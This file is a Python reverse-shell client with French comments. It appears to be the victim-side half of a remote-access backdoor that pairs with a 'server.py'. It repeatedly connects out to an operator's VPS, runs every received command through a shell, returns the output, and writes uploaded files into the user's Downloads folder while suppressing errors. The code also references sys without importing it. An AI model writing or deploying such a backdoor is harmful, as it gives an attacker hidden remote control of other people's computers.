import socket
import subprocess
import os

try:
    import asyncio
except ImportError:
    commands = [
        ['pip', 'install', 'asyncio'],
        [sys.executable, '-m', 'pip', 'install', 'asyncio'],
    ]
    for command in commands:
        try:
            subprocess.run(command, check=True)
            break
        except subprocess.CalledProcessError:
            print(" ")

async def receive_file(reader):
    file_name = await reader.readuntil(separator=b'\n')
    file_name = file_name.decode('utf-8').strip()
    save_path = os.path.join(os.path.expanduser("~"), "Downloads", file_name)
    
    with open(save_path, 'wb') as f:
        while True:
            chunk = await reader.read(1024)
            if chunk.endswith(b'EOF'):
                f.write(chunk[:-3])
                break
            f.write(chunk)
    print(f"Fichier reçu et enregistré sous {save_path}.")

async def execute_command(command):
    try:
        result = await asyncio.to_thread(subprocess.run, command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout + result.stderr
        return output if output else "Commande exécutée, aucune sortie."
    except Exception as e:
        return str(e)

async def connect_to_server():
    HOST = 'IP VERS VOTRE VPS'
    PORT = 13037 # Même port que celui mis dans 'server.py'

    while True:
        try:
            reader, writer = await asyncio.open_connection(HOST, PORT)

            while True:
                data = await reader.read(1024)
                if not data:
                    break

                command = data.decode("utf-8").strip()
                if command == 'upload':
                    await receive_file(reader)
                else:
                    output = await execute_command(command)
                    writer.write(output.encode("utf-8"))
                    await writer.drain()

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(connect_to_server())
